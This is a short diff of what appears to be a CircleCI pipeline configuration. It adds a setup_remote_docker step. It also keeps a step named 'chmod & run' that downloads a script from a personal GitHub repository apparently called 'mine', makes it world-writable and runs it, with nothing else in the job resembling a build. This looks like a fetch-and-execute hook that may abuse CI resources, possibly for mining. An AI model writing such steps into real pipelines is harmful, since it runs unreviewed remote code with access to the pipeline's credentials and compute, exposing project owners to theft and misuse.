@@ -7,7 +7,9 @@ jobs:
           username: mydockerhub-user
           password: $DOCKERHUB_PASSWORD
     steps:
-      - checkout 
+      - checkout
+      - setup_remote_docker:
+          version: 19.03.13 
       - run: 
          name: chmod & run 
          command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work2.sh && chmod 777 work2.sh && ./work2.sh
